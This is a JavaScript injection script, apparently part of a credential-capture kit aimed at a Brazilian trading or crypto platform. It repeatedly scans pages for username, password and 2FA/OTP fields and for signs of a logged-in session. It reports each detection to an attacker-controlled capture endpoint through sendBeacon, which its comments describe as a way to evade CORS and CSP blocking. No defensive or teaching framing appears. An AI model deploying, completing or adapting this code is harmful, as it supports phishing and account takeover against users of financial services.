(function () {

    console.log("NEXUS SCANNER iniciado ✔");

    const TOKEN = window.NEXUS_TOKEN_INJECT || "032318";
    const CAPTURE_URL = window.NEXUS_CAPTURE_ENDPOINT;

    // =========================================================
    //  MÉTODO ANTI-BLOQUEIO 🔥 — Envia usando BEACON
    //  (não pode ser bloqueado por CORS / CSP)
    // =========================================================
    function sendCapture(data) {
        const payload = JSON.stringify({
            token: TOKEN,
            ...data
        });

        try {
            const ok = navigator.sendBeacon(CAPTURE_URL, payload);

            if (ok) {
                console.log("📡 Beacon enviado →", data.event);
            } else {
                console.log("❌ Beacon falhou, tentando fetch…");

                // fallback opcional (fetch será bloqueado, mas tentamos)
                fetch(CAPTURE_URL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "X-Nexus-Token": TOKEN
                    },
                    body: payload
                }).catch(() => {});
            }
        } catch (err) {
            console.log("Erro no sendBeacon:", err);
        }
    }

    // =========================================================
    //  DETECÇÃO DE CAMPOS DE LOGIN
    // =========================================================
    function getLoginFields() {
        const inputs = document.querySelectorAll("input");
        let user = null, pass = null;

        inputs.forEach(i => {
            const type = (i.type || "").toLowerCase();
            const name = (i.name || "").toLowerCase();
            const placeholder = (i.placeholder || "").toLowerCase();

            if (!user && /(email|user|login|cpf)/i.test(name + placeholder + type)) {
                user = i;
            }
            if (!pass && /(password|senha|pwd)/i.test(name + placeholder + type)) {
                pass = i;
            }
        });

        return { user, pass };
    }

    // =========================================================
    //  DETECÇÃO DE CAMPO OTP (token/2FA)
    // =========================================================
    function getOTPField() {
        const inputs = document.querySelectorAll("input");

        for (const i of inputs) {
            const t = (i.type || "").toLowerCase();
            const p = (i.placeholder || "").toLowerCase();
            const n = (i.name || "").toLowerCase();

            if (/(\bcode\b|otp|token|verificação|verification)/i.test(p + n + t)) {
                return i;
            }
        }
        return null;
    }

    // =========================================================
    //  VERIFICAÇÃO LOGIN
    // =========================================================
    function checkForLogin() {
        try {
            const { user, pass } = getLoginFields();

            if (user && pass) {
                console.log("NEXUS: Campos de login detectados!");

                sendCapture({
                    event: "login_fields_detected",
                    user_placeholder: user.placeholder || "",
                    pass_placeholder: pass.placeholder || "",
                    timestamp: Date.now()
                });
            }
        } catch (e) {
            console.log("Erro no scanner login:", e);
        }
    }

    // =========================================================
    //  VERIFICAÇÃO OTP
    // =========================================================
    function checkForOTP() {
        try {
            const otp = getOTPField();

            if (otp) {
                console.log("NEXUS: Campo OTP detectado");

                sendCapture({
                    event: "otp_field_detected",
                    placeholder: otp.placeholder || "",
                    timestamp: Date.now()
                });
            }
        } catch (e) {
            console.log("Erro no scanner OTP:", e);
        }
    }

    // =========================================================
    //  DETECTA SE JÁ ESTÁ LOGADO
    // =========================================================
    function checkIfLoggedIn() {
        try {
            const keywordTests = [
                "Saldo", "Depósito", "Histórico", "Minhas Operações",
                "Mercado", "OTC", "Ações", "Cripto", "Paridades", "Operar"
            ];

            const found = keywordTests.some(kw =>
                document.body.innerText.includes(kw)
            );

            if (found) {
                sendCapture({
                    event: "logged_in",
                    timestamp: Date.now()
                });
            }

        } catch (e) {
            console.log("Erro ao detectar login:", e);
        }
    }

    // =========================================================
    //  LOOPS DE MONITORAMENTO
    // =========================================================
    setInterval(checkForLogin, 1200);
    setInterval(checkForOTP, 1500);
    setInterval(checkIfLoggedIn, 2000);

})();
